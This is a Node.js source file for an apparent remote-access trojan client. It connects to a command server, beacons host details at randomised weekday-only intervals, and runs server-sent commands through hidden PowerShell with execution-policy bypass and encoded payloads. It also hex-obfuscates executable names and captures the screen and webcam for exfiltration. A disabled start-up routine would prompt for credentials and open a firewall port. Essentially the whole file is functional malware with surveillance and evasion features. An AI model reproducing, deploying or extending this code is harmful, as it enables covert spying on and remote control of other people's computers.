const { Socket } = require('node:net');
const { platform, arch, version, hostname } = require('node:os');
const { createHash, randomBytes, pbkdf2Sync, createCipheriv, createDecipheriv } = require('node:crypto');
const { spawn } = require('node:child_process');
const { join } = require('node:path');
const { createWriteStream, unlinkSync, existsSync, mkdirSync } = require('node:fs');
const screenshot = require('screenshot-desktop');
const webcam = require( "node-webcam" );

// Globals
let client = null;
let beaconIntervalInstance = null;
let logStream = null;
let startTime = Date.now();
let exitProcess = false;
let SESSION_ID = null;
const LOGGING = true;
const CVER = "0.2.0";
const TYPE = "js";
const CHUNK_SIZE = 1024;
const SERVER_ADDRESS = 'localhost';
const SERVER_PORT = 54678;
const MAX_RETRIES = 5;
const RETRY_INTERVALS = [
    10000,   // 10 seconds
    30000,   // 30 seconds
    1 * 60 * 1000,   // 1 minute
    2 * 60 * 1000,   // 2 minutes
    4 * 60 * 1000,   // 4 minutes
    6 * 60 * 1000    // 6 minutes
];
const BEACON_MIN_INTERVAL = 5 * 60 * 1000; // 5 minutes
const BEACON_MAX_INTERVAL = 45 * 60 * 1000; // 45 minutes

process.on('SIGINT', () => {
    logIt('Received SIGINT, shutting down gracefully');
    if (client) {
        client.destroy();
    }
    if (logStream) {
        logStream.end()
    }
    process.exit(0);
});

// Create a writable stream for logging
if (LOGGING) {
    const logDir = join(__dirname, 'logs');
    const logFilePath = join(logDir, 'client.log');
    if (!existsSync(logDir)) {
        mkdirSync(logDir, { recursive: true });
    }
    logStream = createWriteStream(logFilePath, { flags: 'a' });
}

// log it
function logIt (message) {
    if (LOGGING && logStream) {
        const timestamp = new Date().toISOString();
        logStream.write(`[${timestamp}] ${message}\n`);
    }
}

const getSessionId = async () => {
    return new Promise((resolve, reject) => {
        try {
            let ipAddress = client.autoSelectFamilyAttemptedAddresses[0].replace(`:${SERVER_PORT}`, '');
            if (ipAddress === '::1') {
                ipAddress = '127.0.0.1';
            }
            logIt(`IP Address: ${ipAddress}`);
            const sum = ipAddress.split('.').reduce((acc, val) => acc + parseInt(val), 0);
            const crypt = createHash('sha256').update(ipAddress + '<>' + sum).digest('hex').slice(0, 32);
            SESSION_ID = crypt;
            resolve(SESSION_ID);
            logIt(`Session ID: ${SESSION_ID}`);
        } catch(err) {
            reject(err);
        }
    });
};

const encryptData = (data, sharedKey) => {
    const salt = randomBytes(32);
    const key = pbkdf2Sync(sharedKey, salt, 200000, 32, 'sha512');
    const iv = randomBytes(12);
    const cipher = createCipheriv('aes-256-gcm', key, iv);
    let encryptedData = cipher.update(data, 'utf8', 'base64');
    encryptedData += cipher.final('base64');
    const authTag = cipher.getAuthTag();
    return `${salt.toString('base64')}:${iv.toString('base64')}:${authTag.toString('base64')}:${encryptedData}`;
};

const decryptData = (encrypted, sharedKey) => {
    const [salt, iv, authTag, encryptedData] = encrypted.split(':').map(part => Buffer.from(part, 'base64'));
    const key = pbkdf2Sync(sharedKey, salt, 200000, 32, 'sha512');
    const decipher = createDecipheriv('aes-256-gcm', key, iv);
    decipher.setAuthTag(authTag);
    let decryptedData = decipher.update(encryptedData, 'base64', 'utf8');
    decryptedData += decipher.final('utf8');
    return decryptedData;
};

const getRetryInterval = (retries) => {
    return retries < RETRY_INTERVALS.length ? RETRY_INTERVALS[retries] : 0;
};

const sendCommand = async (response) => {
    let encrypted = encryptData(JSON.stringify(response), SESSION_ID);
    if (encrypted.length >= CHUNK_SIZE) {
        while (encrypted.length > 0) {
            let chunk = encrypted.substring(0, CHUNK_SIZE);
            encrypted = encrypted.substring(CHUNK_SIZE);
            if (encrypted.length === 0) {
                chunk += '--FIN--';
            }
            logIt(`Sent Chunk: ${chunk.toString('utf8')}`);
            await client.write(chunk);
        }
    } else {
        logIt(`Sent Data: ${encrypted.toString('utf8')}`);
        await client.write(encrypted);
    }
};

const sendBeacon = async () => {
    await sendCommand({ response: { 
        beacon: true, 
        version: CVER, 
        type: TYPE,
        platform: platform(), 
        arch: arch(), 
        osver: version(), 
        hostname: hostname()
    }});
};

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

const utf8To16 = (str) => {
    const buffer = Buffer.alloc(str.length * 2);
    for (let i = 0; i < str.length; i++) {
        buffer.writeUInt16LE(str.charCodeAt(i), i * 2);
    }
    return buffer;
};

const formatFileName = (name, extension) => {
    const now = new Date();
    const year = now.getFullYear();
    const month = String(now.getMonth() + 1).padStart(2, '0');
    const day = String(now.getDate()).padStart(2, '0');
    const hours = String(now.getHours()).padStart(2, '0');
    const minutes = String(now.getMinutes()).padStart(2, '0');
    const seconds = String(now.getSeconds()).padStart(2, '0');
    return `${name}_${year}-${month}-${day}_${hours}-${minutes}-${seconds}.${extension.replace('.','')}`;
};

const runWebcamClip = async () => {
    try {
        const opts = {
            width: 1280,
            height: 720,
            quality: 100,
            frames: 60,
            delay: 0,
            saveShots: true,
            output: "jpeg",
            device: false,
            callbackReturn: "buffer",
            verbose: false
        };
        const fileName = formatFileName('wc','jpg');
        webcam.capture( fileName, opts, async ( err, data ) => {
            if (err) {
                throw new Error(err);
            }
            await sendCommand({ response: { download: `${fileName}`, data: data }});
            unlinkSync(`.\\${fileName}`);
        });
    } catch(err) {
        await sendCommand({ response: { error: `Failed to capture webcam: ${err.message}`}});
    }
};

const runScreenShot = async () => {
    try {
        const img = await screenshot({ format: 'jpg' })
        const fileName = formatFileName('ss','jpg');
        await sendCommand({ response: { download: fileName, data: Buffer.from(img).toString('base64') }});
    } catch(err) {
        await sendCommand({ response: { error: `Failed to capture screenshot: ${err.message}`}});
    }
};

const runCommand = async (command, payload, isFile = false) => {
    try {
        command = command.trim();
        if (!command) {
            throw new Error('No command provided.');
        }
        if (!['cmd', 'ps'].includes(command)) {
            throw new Error('Unsupported command.');
        }
        let args = [];
        switch(command) {
            case "cmd":
                if (payload.includes(';') || payload.includes('&')) {
                    throw new Error('Invalid characters in payload.');
                }
                args = ['/c', payload];
                command = '\x63\x6d\x64\x2e\x65\x78\x65';
                break;
            case "ps":
                args = [
                    '-NonInteractive',
                    '-NoLogo',
                    '-NoProfile',
                    '-WindowStyle', 'hidden',
                    '-ExecutionPolicy', 'Bypass'
                ];
                if (isFile) {
                    args.push('-File', payload);
                } else {
                    const encodedCmd = Buffer.from(utf8To16(payload)).toString('base64');
                    args.push('-EncodedCommand', encodedCmd);
                }
                command = '\x70\x6f\x77\x65\x72\x73\x68\x65\x6c\x6c\x2e\x65\x78\x65';
                break;
        }
        return new Promise((resolve, reject) => {
            const child = spawn(command.toString(), args, { shell: true, timeout: 30000, windowsHide: true });
            let output = '';
            let errorOutput = '';
            child.stdout.on('data', (data) => {
                output += data.toString();
            });
            child.stderr.on('data', (data) => {
                errorOutput += data.toString();
            });
            child.on('close', (code) => {
                if (code !== 0) {
                    reject(`Command failed with code ${code}. Error output: ${errorOutput}`);
                } else {
                    resolve(output.trim());
                }
            });
            child.on('error', (err) => {
                reject(`Failed to execute command: ${err.message}`);
            });
        });
    } catch (error) {
        throw new Error(`Failed to execute command: ${error.message}`);
    }
};

const formatTime = (milliseconds) => {
    const totalSeconds = Math.floor(milliseconds / 1000);
    const days = Math.floor(totalSeconds / 86400);
    const hours = Math.floor((totalSeconds % 86400) / 3600);
    const minutes = Math.floor((totalSeconds % 3600) / 60);
    const seconds = totalSeconds % 60;
    return `${days}d ${hours}h ${minutes}m ${seconds}s`;
};

const getUptime = async () => {
    const currentTime = Date.now();
    const uptimeMillis = currentTime - startTime;
    const uptime = formatTime(uptimeMillis);
    await sendCommand({ response: { data: uptime }});
};

const startUpActions = async () => {
    let sessionPayload = `$nonAdminCred = Get-Credential; Enter-PSSession -ComputerName localhost -ConfigurationName JEAMaintenance`
    let response = await runCommand('ps', sessionPayload);
    logIt('PS Session: %s', response);
    let openPortPayload = `If (-not (Get-NetFirewallRule -DisplayName "Allow Inbound Application Traffic" -ErrorAction SilentlyContinue)) { New-NetFirewallRule -DisplayName "Allow Inbound Application Traffic" -Direction Inbound -Protocol TCP -LocalPort ${SERVER_PORT} -Action Allow -Profile Any -Description "Allow inbound traffic" }`;
    response = await runCommand('ps', openPortPayload);
    logIt('Firewall Rule Creation: %s', response);
};

const parseAction = async (action) => {
    try {
        const [command, ...properties] = action.trim().split(/ +(?=(?:(?:[^"]*"){2})*[^"]*$)/); // Use regex to split by any whitespace
        logIt(`Command: ${command} - Properties: ${properties.join(' ')}`);
        let payload = null;
        if (command === 'ps' || command === 'cmd') {
            payload = Buffer.from(properties[0], 'base64').toString('utf8');
        } else if (command === 'up') {
            await getUptime();
            return;
        } else if (command === 'di') {
            exitProcess = true;
            if (client) {
                client.destroy();
            }
            if (logStream) {
                logStream.end()
            }
            process.exit(0);
        } else if (command === 'ss') {
            await runScreenShot();
            return;
        } else if (command === 'wc') {
            await runWebcamClip();
            return;
        }
        const result = await runCommand(command, payload);
        if (result.includes("download")) {
            await sendCommand({ response: JSON.parse(result)});
        } else {
            await sendCommand({ response: { data: result }});
        }
    } catch(err) {
        await sendCommand({ response: { error: `Error: ${err.message}` }});
    }
};

// Connect to server function
const connectToServer = async () => {
    //TODO: fix start up actions
    //await startUpActions();
    try {
        client = new Socket();
        const options = {
            port: SERVER_PORT,
            host: SERVER_ADDRESS,
            autoSelectFamily: true,
            keepAlive: true,
            noDelay: true
        };
        client.connect(options, async () => {
            logIt(`Client ${CVER} connected.`);
            await getSessionId();
            await sendBeacon();
            const beaconInterval = Math.floor(Math.random() * (BEACON_MAX_INTERVAL - BEACON_MIN_INTERVAL + 1)) + BEACON_MIN_INTERVAL;
            beaconIntervalInstance = setInterval(async () => {
                const now = new Date();
                const day = now.getDay();
                const hour = now.getHours();
                // Check if the current day is Monday through Friday (1-5) and the hour is between 7 AM and 7 PM (inclusive)
                if (day >= 1 && day <= 5 && hour >= 7 && hour <= 19) {
                    await sendBeacon();
                }
            }, beaconInterval);
        });
        client.on('data', async (data) => {
            logIt(`Received Data: ${data.toString('utf8')}`);
            const action = decryptData(data.toString('utf8'), SESSION_ID);
            if (action) {
                await parseAction(action);
            }
        });
        client.on('close', async () => {
            logIt('Connection to server closing.');
            if (beaconIntervalInstance) {
                clearInterval(beaconIntervalInstance);
            }
            if (!exitProcess) {
                let connectionRetries = 0;
                if (connectionRetries <= MAX_RETRIES) {
                    const retryInterval = getRetryInterval(connectionRetries);
                    logIt(`Attempting to reconnect in ${retryInterval / 1000} seconds...`);
                    connectionRetries++;
                    await sleep(retryInterval);
                    client.destroy();
                    await connectToServer();
                } else {
                    logIt('Max retries reached. Exiting.');
                    await sleep(BEACON_MAX_INTERVAL * 8);
                }
            }
        });
        client.on('error', (err) => {
            if (beaconIntervalInstance) {
                clearInterval(beaconIntervalInstance);
            }
            if (client) {
                client.destroy();
            }
            logIt(`Error: Client connection failed. ${err.message}`);
        });
    } catch (err) {
        logIt(`Exception: ${err.message}`);
    }
};
connectToServer();